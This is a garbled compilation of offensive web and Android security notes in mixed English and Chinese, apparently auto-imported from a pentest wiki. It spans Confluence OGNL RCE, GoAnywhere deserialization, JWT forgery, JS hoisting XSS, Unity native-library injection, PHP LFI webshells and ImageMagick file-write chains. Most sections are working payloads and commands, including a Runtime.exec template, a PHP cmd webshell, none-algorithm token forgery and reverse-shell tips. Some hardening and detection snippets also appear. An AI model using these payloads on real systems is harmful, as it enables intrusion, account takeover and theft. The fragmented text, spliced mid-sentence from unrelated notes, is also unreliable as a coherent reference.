Python unmarshalling can execute code. Legacy formats (older HDF5 saves) or older codebases may not enforce modern checks, so “downgrade” style attacks can still apply when victims use older loaders. retrieve class or fn used unrestricted importlib.import module() with attacker-controlled module strings from config.json. Impact: Arbitrary import of any installed module (or attacker-planted module on sys.path). Import-time code runs, then object construction occurs with attacker kwargs. Trigger points: code may run multiple times (e.g., during layer build/first call, model.load model, and predict/fit). Make 载荷 idempotent. Validation: a benign 载荷 like os.system ("ping -c 1 YOUR IP") helps confirm execution (e.g., observe ICMP with tcpdump) before switching to a 反弹 Shell. Not execute code or cause execution (no compiled/source code objects, shelling out, hooks, etc.) Prefer non-pickle model formats when possible (e.g., SafeTensors). This requirement aims to enhance security by specifying the privileges being queried: check it here VIEW READONLY WORKFLOW https://github.com/bcoles/jira scan Affects Confluence Data Center/Server 8.0.x–8.5.3 & 8.4.5. Vulnerable Velocity template text-inline.vm allows OGNL evaluation without 认证. Response header x-cmd will contain the command output. Swap id for a 反弹 Shell 载荷. For a shell, 上传 a .lang file containing 载荷 like: Trigger by selecting the malicious language in any Code Macro body. Metasploit module 利用 /multi/http/atlassian confluence rce cve 2024 21683 automates auth + 上传 + exec. Stealing Session Tokens: Add an endpoint that will echo the headers in the response (with the cookie) and some javascript that will contact it and leak the cookies. Command Execution: Ofc it's possible to create a plugin that will execute code. 反弹 Shell: Or get a 反弹 Shell. # 命令 / 载荷 / 操作片段 # 1. CVE-2024-21683 – authenticated RCE via Code Macro 上传 12345678<?xml version="1.0"?><languages> <language key="pwn" name="pwn" namespace="java.lang"> <tokens> <token scope="normal">${"".getClass().forName("java.lang.Runtime").getRuntime().exec("id")}</token> </tokens> </language></languages> # 4. Negative state: the target reflects attacker-controlled text into a place that is parsed as valid JavaScript, so the attacker can force a callback such as window.parent.foo(). showResult("<attacker>"); # 命令 / 载荷 / 操作片段 # 1. Start every candidate as "good".2. Load the target response as a script.3. If the response executes `window.parent.foo()`, mark the candidate as wrong.4. If no callback fires, keep the candidate and continue brute-forcing.## Minimal Probe PatternIn many real targets, an iframe is not required. A direct script inclusion is enough: # 3. title: Java SignedObject-gated Deserialization and Pre-auth Reachability via Error Paths 技术笔记
content: 来源路径： 02-知识点/Web安全/Java SignedObject-gated Deserialization and Pre-auth Reachability via Error Paths 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Java SignedObject-gated Deserialization and Pre-auth Reachability via Error Paths 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 Java SignedObject-gated Deserialization and Pre-auth Reachability via Error Paths 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 Java SignedObject-gated Deserialization and Pre-auth Reachability via Error Paths 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：Java SignedObject-gated Deserialization and Pre-auth Reachability via Error Paths、Threat model、Typical vulnerable pattern、利用 considerations、Pre-auth reachability via error-handling flows；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 5 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Java SignedObject-gated Deserialization and Pre-auth Reachability via Error Paths Threat model Typical vulnerable pattern 利用 considerations Pre-auth reachability via error-handling flows Blue-team 检测 Hardening guidance Example attack chain recap (CVE-2025-10035) Fixed versions and behavioural changes Notes on JSF/ViewState # 核心要点 Attacker can reach an HTTP endpoint that eventually processes an attacker-supplied byte[] intended to be a serialized SignedObject. A signature gate at (2) enforces that the SignedObject must verify against a product-baked public key. Unless the attacker can produce a valid signature, the inner gadget never deserializes. To achieve code execution, an attacker must deliver a correctly signed SignedObject that wraps a malicious gadget chain as its inner object. This generally requires one of the following: Signing oracle: coerce the vendor or a trusted signing service to sign attacker-controlled serialized content (e.g., if a license server signs an embedded arbitrary object from client input). Absent one of these, signature verification will prevent 利用 despite the presence of a deserialization sink. Even when a deserialization endpoint appears to require 认证 or a session-bound 令牌，error-handling code can inadvertently mint and attach the 令牌 to an unauthenticated session. Target servlet: /goanywhere/lic/accept/<GUID> requires a session-bound license request 令牌. SessionUtilities.generateLicenseRequestToken(session) The bundle can be decrypted offline (hard-coded keys) to recover the GUID. Keep the same session cookie and POST to /goanywhere/lic/accept/<GUID> with attacker-controlled bundle bytes, reaching the SignedObject sink pre-auth. Patched: redirect without bundle (no 令牌 generation). Remove error-handler flows that issue session-bound tokens for unauthenticated users. Treat error paths as attack surface. Remove error-handler 令牌 generation, closing pre-auth reachability. # 命令 / 载荷 / 操作片段 # 1. Pre-auth reachability via error-handling flows 12GET /goanywhere/license/Unlicensed.xhtml/x?javax.faces.ViewState=x&GARequestAction=activate HTTP/1.1Host: <target> # 2. Blue-team 检测 1234567java.io.ObjectInputStream.readObjectjava.security.SignedObject.getObjectcom.linoma.license.gen2.BundleWorker.verifycom.linoma.license.gen2.BundleWorker.unbundlecom.linoma.license.gen2.LicenseController.getResponsecom.linoma.license.gen2.LicenseAPI.getResponsecom.linoma.ga.ui.admin.servlet.LicenseResponseServlet.doPost # 3. Hardening guidance 12345678ObjectInputFilter filter = info -> { Class<?> c = info.serialClass(); if (c == null) return ObjectInputFilter.Status.UNDECIDED; if (c == java.security.SignedObject.class || c == byte[].class) return ObjectInputFilter.Status.ALLOWED; return ObjectInputFilter.Status.REJECTED; // outer layer};ObjectInputFilter.Config.setSerialFilter(filter);// For the inner object, apply a separate strict DTO allow-list # 4. Example attack chain recap (CVE-2025-10035) 1GET /goanywhere/license/Unlicensed.xhtml/watchTowr?javax.faces.ViewState=watchTowr&GARequestAction=activate # 5. Example attack chain recap (CVE-2025-10035) 12345POST /goanywhere/lic/accept/<GUID> HTTP/1.1Cookie: ASESSIONID=<value>Content-Type: application/x-www-form-urlencodedbundle=<attacker-controlled-bytes> # 工具与参考入口 watchTowr Labs – Is This Bad? This Feels Bad — GoAnywhere CVE-2025-10035 # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

This information can be verified and trusted because it is digitally signed. ticarpi/JWT tool：🐍 A toolkit for testing, tweaking and cracking JSON Web Tokens JSON Web 令牌 : Base64 (Header).Base64 (Data).Base64 (Signature) iss: issuer of the 令牌 exp: the expiration timestamp (reject tokens which have expired). Note: as defined in the spec, this must be in seconds. nbf: "not before" is a future time when the 令牌 will become active. sub: subject of the 令牌 (rarely used) aud: audience of the 令牌 (also rarely used) CVE-2019-7644: Security 漏洞 in Auth0-WCF-Service-JWT Manually using the following steps to edit an RS256 JWT 令牌 into an HS256 侦察: python3 JWT tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw Scanning: python3 JWT tool.py -t https://www.ticarpi.com/ -rc "JWT=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -M pb 利用: python3 JWT tool.py -t https://www.ticarpi.com/ -rc "JWT=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin Dictionary attack: hashcat -a 0 -m 16500 JWT.txt wordlist.txt # 命令 / 载荷 / 操作片段 # 1. JWT Format 123eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 # headereyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ # payloadUL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # signature # 2. Header 1234{ "typ": "JWT", "alg": "HS256"} # 3. 载荷 123456{ "sub":"1234567890", "name":"Amazing Haxx0r", "exp":"1466270722", "admin":true} # 4. JWT Signature：Null Signature Attack (CVE-2020-28042) 1python3 jwt_tool.py JWT_HERE -X n # 5. JWT Signature：Null Signature Attack (CVE-2020-28042) 12{"alg":"HS256","typ":"JWT"}.{"sub":"1234567890","name":"John Doe","iat":1516239022} # 6. JWT Signature：Disclosure of a correct signature (CVE-2019-7644) 12Invalid signature. Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c got 9twuPVu9Wj3PBneGw1ctrf3knr7RX12v-UwocfLhXIsInvalid signature. Expected 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y= got 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgBOo= # 7. JWT Signature：None Algorithm (CVE-2015-9235) 1python3 jwt_tool.py [JWT_HERE] -X a # 8. JWT Signature：None Algorithm (CVE-2015-9235) 123456789import jwt jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ' decodedToken = jwt.decode(jwtToken, verify=False) # decode the token before encoding with type 'None' noneEncoded = jwt.encode(decodedToken, key='', algorithm=None) print(noneEncoded.decode()) # 9. JWT Signature：Key Confusion Attack RS256 to HS256 (CVE-2016-5431) 1234import jwtpublic = open('public.pem', 'r').read()print publicprint jwt.encode({"data":"test"}, key=public, algorithm='HS256') # 10. JWT Signature：Key Confusion Attack RS256 to HS256 (CVE-2016-5431) 1python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem # 11. JWT Signature：Key Confusion Attack RS256 to HS256 (CVE-2016-5431) 12$ cat key.pem | xxd -p | tr -d "\\n" 2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a # 12. JWT Signature：Key Confusion Attack RS256 to HS256 (CVE-2016-5431) 123$ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a (stdin)= 8f421b351eb61ff226d

Origin Duration Brute-force HMAC secret Derive JWT secrets from leaked config + DB data Modify the algorithm to None JWE-wrapped PlainJWT /public-key auth 绕过 (pac4j-JWT CVE-2026-29000) Change the algorithm RS256(asymmetric) to HS256(symmetric) (CVE-2016-5431/CVE-2016-10555) New public key inside the header JWKS Spoofing Kid Issues Overview Revealing Key through "kid" 路径穿越 with "kid" SQL 注入 via "kid" # 核心要点 Part of this post is based in the awesome post: https://github.com/ticarpi/JWT tool/wiki/Attack - 方法论 \ You can also use the Burp Extension SignSaboteur to launch JWT attacks from Burp. Scope the session control: Pick a user-specific request (e.g., profile, billing). Remove cookies/headers one at a time until the request is rejected to isolate which 令牌 (s) actually gate 授权. Decode and enumerate: Use Burp JWT Editor or python3 JWT tool.py <JWT> to read header / 载荷. Note alg, exp / 令牌 lifetime, and authn/authz-driving claims (role, id, username, email, etc.). Signature enforcement sanity check: Flip or delete a few bytes in the signature portion and replay. Acceptance implies missing signature validation and you can directly tamper 载荷 claims. Goal: Modify 载荷 claims to escalate privileges; every attack below aims to get the server to accept a tampered 载荷 by abusing weak verification, weak secrets, or unsafe key selection. No change suggests no verification; this is when to experiment with tampering 载荷 claims. Tokens first seen from the client side suggest the key might be exposed to client-side code, necessitating further investigation. Tokens originating server-side indicate a secure process. The application accepts JWE bearer tokens 授权 depends on attacker-controlled claims such as sub, role, groups, or scope Impact: forge an encrypted 令牌 for any user/role using only the public key Enumerate the frontend / API docs for clues such as RSA-OAEP-256, A128GCM/A256GCM, jwks, or comments saying "inner JWT is signed". Build the inner 令牌 manually as base64url (header) + "." + base64url (载荷) + "." so the signature is empty. # 命令 / 载荷 / 操作片段 # 1. Quick Wins 123python3 jwt_tool.py -M at \ -t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \ -rh "Authorization: Bearer eyJhbG...<JWT Token>" # 2. Quick Wins 1python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291" # 3. Brute-force HMAC secret 12python3 jwt_tool.py <JWT> -C -d wordlist.txthashcat -a 0 -m 16500 jwt.txt /path/to/wordlist.txt -r /usr/share/hashcat/rules/best64.rule # 4. Derive JWT secrets from leaked config + DB data 123jwt_secret = sha256(encryption_key[::2]).hexdigest() # signing keyjwt_hash = b64encode(sha256(f"{email}:{password_hash}")).decode()[:10]token = jwt.encode({"id": user_id, "hash": jwt_hash}, jwt_secret, "HS256") # 5. JWE-wrapped PlainJWT /public-key auth 绕过 (pac4j-JWT CVE-2026-29000) 1234567header = {"alg": "none"}claims = {"sub": "admin", "role": "ROLE_ADMIN", "iss": "target"}b64 = lambda b: base64.urlsafe_b64encode(b).decode().rstrip("=")plain = ( f"{b64(json.dumps(header, separators=(',', ':')).encode())}." f"{b64(json.dumps(claims, separators=(',', ':')).encode())}.") # 6. JWE-wrapped PlainJWT /public-key auth 绕过 (pac4j-JWT CVE-2026-29000) 1234567rsa_key = jwk.JWK(**jwks["keys"][0])token = jwe.JWE( plaintext=plain.encode(), protected=json.dumps({"alg": "RSA-OAEP-256", "enc": "A256GCM"}), recipient=rsa_key,)forged = token.serialize(compact=True) # 7. content: 来源路径： 02-知识点/Web安全/JS Hoisting 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # JS Hoisting 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 JS Hoisting 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 JS Hoisting 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：JS Hoisting、Basic Information、Types of Hoisting、Scenarios、More Scenarios；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 8 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 JS Hoisting Basic Information Types of Hoisting Scenarios More Scenarios Hoisting to 绕过 exception handling Preempt later declarations by locking a name with const Dynamic import() with user-controlled specifiers Tooling # 核心要点 The placement of code within the script affects execution due to hoisting, although the executed code might differ from its textual representation. Therefore if you have scenarios where you can Inject JS code after an undeclared object is used, you could fix the syntax by declaring it (so your code gets executed instead of throwing an error): When the sink is wrapped in a try { x.y(...) } catch { ... }, ReferenceError will stop execution before your 载荷 runs. You can pre-declare the missing identifier so the call survives and your injected expression executes first: function x(){} is hoisted before evaluation, so the parser no longer throws on x.y(...); prompt() executes before y is resolved, then a TypeError is thrown after your code has run. If your 载荷 is executed inside eval (), remember that const/let inside eval are block-scoped and won’t create global bindings. Inject a new <script> element with the code to establish a true global const. # 命令 / 载荷 / 操作片段 # 1. Scenarios 12345678// The function vulnerableFunction is not definedvulnerableFunction('test', '<INJECTION>');// You can define it in your injection to execute JS//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b'-alert(1)-''); function vulnerableFunction(a,b){return 1};//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)test'); function vulnerableFunction(a,b){ return 1 };alert(1) # 2. Scenarios 123456789// If a variable is not defined, you could define it in the injection// In the following example var a is not definedfunction myFunction(a,b){ return 1};myFunction(a, '<INJECTION>')//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3btest'); var a = 1; alert(1); # 3. Scenarios 12345678// If an undeclared class is used, you cannot declare it AFTER being usedvar variable = new unexploitableClass();<INJECTION>// But you can actually declare it as a function, being able to fix the syntax with something like:function unexploitableClass() { return 1;}alert(1); # 4. Scenarios 12345// Properties are not hoisted// So the following examples where the 'cookie' attribute doesn´t exist// cannot be fixed if you can only inject after that code:test.cookie("leo", "INJECTION")test[("cookie", "injection")] # 5. More Scenarios 123456// Undeclared var accessing to an undeclared methodx.y(1,INJECTION)// You can injectalert(1));function x(){}//// And execute the allert with (the alert is resolved before it's detected that the "y" is undefinedx.y(1,alert(1));function x(){}//) # 6. More Scenarios 12345678910111213141516171819// Undeclared var accessing 2 nested undeclared methodx.y.z(1,INJECTION)// You can inject");import {x} from "https://example.com/module.js"//// It will be executedx.y.z("alert(1)");import {x} from "https://example.com/module.js"//")// The imported module:// module.jsvar x = { y: { z: function(param) { eval(param); } }};export { x }; # 7. Two very common patterns during Android app pentests are: Passing crafted extras to exported Activities/Services/BroadcastReceivers that are later forwarded to privileged, non-exported components. Triggering exported VIEW/BROWSABLE deep links that forward attacker-controlled URLs into internal WebViews or other sensitive sinks. HTML/JS executes inside the app’s WebView profile. If JavaScript is enabled (by default or due to misordered checks), you can enumerate/use any exposed @JavascriptInterface objects, steal WebView cookies/local storage, and pivot. webview-attacks.md Effect: dlopen(<absolute-path>, RTLD NOW) very early in init, loading attacker-controlled ELF inside the target app’s process with its UID and permissions. Supplying the pre-init flag points Unity at an attacker-controlled ELF path within an allowed linker namespace path (see constraints below). The exact /data/app/... path varies across devices/installs. An attacker app can retrieve its own native lib dir at runtime via getApplicationInfo().nativeLibraryDir and communicate it to the trigger. Any component capable of launching activities can fire the same 载荷: Activities, foreground Services (with FLAG ACTIVITY NEW TASK), Tiles, Complications. startActivity/sendBroadcast using attacker-supplied Intent extras that are later re-parsed (Intent.parseUri(...)) and executed. Approach: decompile and scan Smali for calls like getStringExtra("key"), getIntExtra("id", ...), getParcelableExtra("redirect intent"), getSerializableExtra(...), getBooleanExtra(...), getAction(), getData() to infer which extras and fields are consumed by each component. Output: for every exported Activity/Service/Receiver/Provider, the tool prints a short explanation and the exact adb shell am .../cmd content ... command with correctly typed flags. Use adb shell cmd content query|insert|update|delete ... to hit ContentProviders without agents. # 命令 / 载荷 / 操作片段 # 1. Deep links → WebView sink (URL parameter injection) 1myscheme://com.example.app/web?url=<attacker_url> # 2. Deep links → WebView sink (URL parameter injection) 1234567# Implicit VIEW intentadb shell am start -a android.intent.action.VIEW \ -d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"# Or explicitly target an Activityadb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \ -d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html" # 3. Unity Runtime: Intent-to-CLI extras → pre-init native library injection (RCE) 1234// lookup the arg valueinitLibPath = FUN_00272540(uVar5, "xrsdk-pre-init-library");// load arbitrary native library earlylVar2 = dlopen(initLibPath, 2); // RTLD_NOW # 4. Unity Runtime: Intent-to-CLI extras → pre-init native library injection (RCE) 1<application android:extractNativeLibs="true" ...> # 5. Unity Runtime: Intent-to-CLI extras → pre-init native library injection (RCE) 123adb shell am start \ -n com.victim.pkg/com.unity3d.player.UnityPlayerActivity \ -e unity "-xrsdk-pre-init-library /data/app/~~ATTACKER_PKG==/lib/arm64/libpayload.so" # 6. You can do this in Proxy --> Options --> Import / Export CA certificate Then, to configure burps certificate do: Once the machine finish rebooting the burp certificate will be in use by it! If you rooted your device with Magisk (maybe an emulator), and you can't follow the previous steps to install the Burp cert because the filesystem is read-only and you cannot remount it writable, there is another way. Install a CA certificate: Just drag&drop the DER Burp certificate changing the extension to .crt in the mobile so it's stored in the Downloads folder and go to Install a certificate -> CA certificate Check that the certificate was correctly stored going to Trusted 凭据 -> USER After rebooting, go to Trusted 凭据 -> SYSTEM and check the Postswigger cert is there # 命令 / 载荷 / 操作片段 # 1. System-wide proxy via ADB 12345# Set proxy (device/emulator must reach your host IP)adb shell settings put global http_proxy 192.168.1.2:8080# Clear proxyadb shell settings put global http_proxy :0 # 2. On a Virtual Machine 1C:\Users\<UserName>\AppData\Local\Android\Sdk\tools\emulator.exe -avd "AVD9" -http-proxy 192.168.1.12:8080 -writable-system # 3. On a Virtual Machine 12345678openssl x509 -inform DER -in burp_cacert.der -out burp_cacert.pemCERTHASHNAME="`openssl x509 -inform PEM -subject_hash_old -in burp_cacert.pem | head -1`.0"mv burp_cacert.pem $CERTHASHNAME #Correct nameadb root && sleep 2 && adb remount #Allow to write on /systeadb push $CERTHASHNAME /sdcard/ #Upload certificateadb shell mv /sdcard/$CERTHASHNAME /system/etc/security/cacerts/ #Move to correct locationadb shell chmod 644 /system/etc/security/cacerts/$CERTHASHNAME #Assign privilegesadb reboot #Now, reboot the machine # 4. Post Android 14 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# Create a separate temp directory, to hold the current certificates# Otherwise, when we add the mount we can't read the current certs anymore.mkdir -p -m 700 /data/local/tmp/tmp-ca-copy# Copy out the existing certificatescp /apex/com.android.conscrypt/cacerts/* /data/local/tmp/tmp-ca-copy/# Create the in-memory mount on top of the system certs foldermount -t tmpfs tmpfs /system/etc/security/cacerts# Copy the existing certs back into the tmpfs, so we keep trusting themmv /data/local/tmp/tmp-ca-copy/* /system/etc/security/cacerts/# Copy our new cert in, so we trust that toomv $CERTIFICATE_PATH /system/etc/security/cacerts/# Update the perms & selinux context labelschown root:root /system/etc/security/cacerts/*chmod 644 /system/etc/security/cacerts/*chcon u:object_r:system_file:s0 /system/etc/security/cacerts/*# Deal with the APEX overrides, which need injecting into each namespace:# First we get the Zygote process(es), which launch each appZYGOTE_PID=$(pidof zygote || true)ZYGOTE64_PID=$(pidof zygote64 || true)# N.b. some devices appear to have both!# Apps inherit the Zygote's mounts at startup, so we inject here to ensure# all newly started apps will see these certs straight away:for Z_PID in "$ZYGOTE_PID" "$ZYGOTE64_PID"; do if [ -n "$Z_PID" ]; then nsenter --mount=/proc/$Z_PID/ns/mnt -- \ /bin/mount --bind /system/etc/security/cacerts /apex/com.android.conscrypt/cacerts fidone# Then we inject the mount into all already running apps, so they# too see these CA certs immediately:# Get the PID of every process whose parent is one of the Zygotes:APP_PIDS=$( echo "$ZYGOTE_PID $ZYGOTE64_PID" | \ xargs -n1 ps -o 'PID' -P | \ grep -v PID)# Inject into the mount namespace of each of those apps:for PID in $APP_PIDS; do nsenter --mount=/proc/$PID/ns/mnt -- \ /bin/mount --bind /system/etc/security/cacerts /apex/com.android.conscrypt/cacerts &donewait # Launched in parallel - wait for completion hereecho "System certificate injected" # 5. Bind-mounting through NSEnter 1mount -t tmpfs tmpfs /system/etc/security/cacerts # 6. Bind-mounting through NSEnter 123nsenter --mo

The 载荷 encoded in base64 is "<?php system ($ GET ['cmd']);echo 'Shell done !'; ?>". Fun fact: you can trigger an XSS and 绕过 the Chrome Auditor with : http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+ When used in PHP or a similar application, it may allow an attacker to specify commands to execute in the system's shell, as the expect:// wrapper can invoke shell commands as part of its input. Specify your 载荷 in the POST parameters, this can be done with a simple curl command. Alternatively, Kadimus has a module to automate this attack. Create an evil 载荷: echo "<pre><?php system ($ GET ['cmd']); ?></pre>" > 载荷.php; 上传 the archive and access the file using the wrappers: Create a phar archive containing a backdoor file: php --define phar.readonly=0 archive.php Vulnerable parameter should be in a POST request. # 命令 / 载荷 / 操作片段 # 1. content: 来源路径： 02-知识点/Web安全/ImageMagick Security 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # ImageMagick Security 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 ImageMagick Security 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 ImageMagick Security 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：ImageMagick Security、SVG -> MVG injection -> msl: execution、Ghostscript delegate as the file dropper、Quick triage、Towards Safer Policies；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 10 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 ImageMagick Security SVG -> MVG injection -> msl: execution Ghostscript delegate as the file dropper Quick triage Towards Safer Policies Allowlist vs Denylist Approach Case Sensitivity in Policies Resource Limits Policy Fragmentation A Starter, Restrictive Policy # 核心要点 ImageMagick is commonly used behind 上传，thumbnailing, document-conversion, and CI/CD pipelines. That makes it a high-value target whenever untrusted images, SVGs, EPS, PS, or PDFs reach magick /convert. Classic ImageTragick-style 载荷 are only part of the story. A modern chain can start from a single SVG and end in arbitrary 文件写入 by abusing how ImageMagick generates MVG plus how it delegates EPS/PS parsing to Ghostscript. When ImageMagick rasterizes SVG, it first emits an intermediate MVG script. If attacker-controlled SVG data reaches that generated MVG without normalizing both LF and CR, an XML-encoded carriage return ( ) can become a new MVG line. A practical injection point is the <polyline points="..."> attribute because the points string is copied into MVG almost verbatim. A 载荷 like: can turn one SVG attribute into attacker-controlled MVG commands. If msl: is reachable, an attacker can execute Magick Scripting Language from disk and turn the bug into arbitrary 文件写入: .tempfile creates a writable temp file and also extends the read/write/control permit lists for that temp path. writestring stores attacker-controlled MSL bytes. renamefile moves the random temp name to a predictable filename such as /tmp/ 载荷.msl. Run conversions in a sandbox (nsjail, firejail, 容器，read-only filesystem, restricted tmpdir). # 命令 / 载荷 / 操作片段 # 1. SVG -> MVG injection -> msl: execution 1<polyline points="0,0 50,50&#13;image Over 0,0 1,1 'msl:/tmp/payload.msl'&#13;100,0"/> # 2. SVG -> MVG injection -> msl: execution 1image Over X,Y W,H 'URL' # 3. SVG -> MVG injection -> msl: execution 1234<image> <read filename="xc:red[10x10]"/> <write filename="png:/var/www/html/poc.png"/></image> # 4. Ghostscript delegate as the file dropper 1data:image/x-eps;base64,... # 5. Ghostscript delegate as the file dropper 1msl:/tmp/payload.msl # 6. Quick triage 1234magick -list policyidentify -list format | grep -E 'SVG|MSL|PS|EPS|PDF'convert -list delegate | grep -iE 'gs|ghostscript'find / -iname policy.xml 2>/dev/null # 7. Quick triage 1magick input.svg output.png # 8. Allowlist vs Denylist Approach 1234... <policy domain="coder" rights="none" pattern="*" /> <policy domain="coder" rights="read | write" pattern="{GIF,JPEG,PNG,WEBP}" /> ... # 9. Policy Fragmentation 1$ find / -iname policy.xml # 10. A Starter, Restrictive Policy 1<policy domain="coder" rights="none" pattern="{SVG,EPS,PS,MSL}" /> # 工具与参考入口 tool has been developed ImageMagick Security Policy Evaluator ImagePanick PoC / Docker lab # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 Pwn 基础链路 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/Web安全/Iframes in XSS, CSP and SOP 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Iframes in XSS, CSP and SOP 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 Iframes in XSS, CSP and SOP 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 Iframes in XSS, CSP and SOP 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：Iframes in XSS, CSP and SOP、Iframes in XSS、srcdoc quirks that matter in real exploits、Iframes with CSP <a href="#iframes with csp 40" id="iframes with csp 40"></a>、New (2023-2025) CSP 绕过 techniques with iframes；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 11 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Iframes in XSS, CSP and SOP Iframes in XSS srcdoc quirks that matter in real exploits Iframes with CSP <a href="#iframes with csp 40" id="iframes with csp 40"></a> New (2023-2025) CSP 绕过 techniques with iframes # 核心要点 Two details around srcdoc are easy to miss during 利用: Unless the frame is sandboxed without allow-same-origin, a srcdoc document is same-origin with the parent. Therefore, injecting attacker-controlled HTML into srcdoc is usually equivalent to giving it direct DOM access to the top document. Even though the document URL is about:srcdoc, relative URLs are resolved using the embedding page URL as the base URL. This means 载荷 such as or <img src="/internal/debug"> will target the parent origin, not about:srcdoc . Practical 载荷: This is specially useful when you only control markup but know a same-origin path that returns attacker-controlled JavaScript, JSONP, or HTML without a restrictive CSP. Please, note how in the following bypasses the response to the iframed page doesn't contain any CSP header that prevents JS execution. # 命令 / 载荷 / 操作片段 # 1. Iframes in XSS 12345678910<html> id="if3" srcdoc=""></iframe> id="if4" 